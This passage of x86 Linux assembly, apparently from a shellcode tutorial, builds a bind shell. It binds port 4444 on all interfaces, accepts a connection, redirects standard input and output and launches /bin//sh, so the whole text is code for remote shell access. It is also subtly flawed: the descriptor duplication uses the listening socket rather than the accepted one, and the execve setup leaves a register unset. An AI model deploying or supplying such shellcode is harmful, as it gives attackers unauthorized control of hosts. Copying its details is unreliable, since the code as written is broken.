; Assume socketcall is syscall number 102, SYS_BIND is 2, SYS_LISTEN is 4, and SYS_ACCEPT is 5.

; First, create a socket as before

; Then bind the socket to a port on the local machine
; struct sockaddr_in as above.

push dword 0x00000000      ; Any IP (INADDR_ANY)
push dword 0x5C110002      ; The port number (4444) and AF_INET
mov ecx, esp               ; Save pointer to struct sockaddr

; Argument setup for the bind() call
push 16                    ; sizeof(struct sockaddr)
push ecx                   ; pointer to struct sockaddr
push edi                   ; socket descriptor
mov ecx, esp               ; pointer to arguments
mov ebx, 2                 ; SYS_BIND within socketcall
mov eax, 102               ; syscall number for socketcall
int 0x80                   ; call kernel

; Listen for incoming connections
push 0x1                   ; Backlog argument
push edi                   ; socket descriptor
mov ecx, esp               ; pointer to arguments
mov ebx, 4                 ; SYS_LISTEN within socketcall
mov eax, 102               ; syscall number for socketcall
int 0x80                   ; call kernel

; Accept a connection
push 0x0                   ; Size of sockaddr structure (we don't care here)
push 0x0                   ; Address of sockaddr structure (we don't care here)
push edi                   ; socket descriptor
mov ecx, esp               ; pointer to arguments
mov ebx, 5                 ; SYS_ACCEPT within socketcall
mov eax, 102               ; syscall number for socketcall
int 0x80                   ; call kernel

                                ; Duplicate file descriptors, execute a shell as above
dup2:
mov ecx, 2                 ; Starting with stderr
loop_dup2:
  mov eax, 63              ; syscall number for dup2
  mov ebx, edi             ; our socket descriptor
  int 0x80                 ; call kernel
  dec ecx
  jns loop_dup2            ; Loop for stdin and stdout

; Finally, execute a shell
mov eax, 11                ; syscall number for execve
push 0x00                  ; terminate array with NULL
push 0x68732F2F            ; push the string //sh in reverse (since stack is LIFO)
push 0x6E69622F            ; push the string /bin in reverse
mov ebx, esp               ; pointer to "/bin//sh\0"
push 0x00                  ; terminate array with NULL
push ebx                   ; pointer to the array ["bin//sh", NULL]
mov ecx, esp               ; pointer to the array of pointers
int 0x80                   ; call kernel
